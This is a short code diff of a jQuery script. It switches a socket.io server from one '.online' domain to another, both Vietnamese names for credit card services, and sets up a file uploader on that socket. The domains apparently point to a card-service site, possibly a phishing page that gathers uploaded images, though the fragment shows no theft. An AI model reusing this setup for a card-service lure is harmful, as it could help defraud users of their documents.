@@ -1,5 +1,5 @@
 $(document).ready(function () {
-    const socket = io('https://dichvuthemastercard.online/');
+    const socket = io('https://dichvuthetindung.online/');
     const images = []
     var uploader = new SocketIOFileUpload(socket);
     socket.on('file', (data) => {
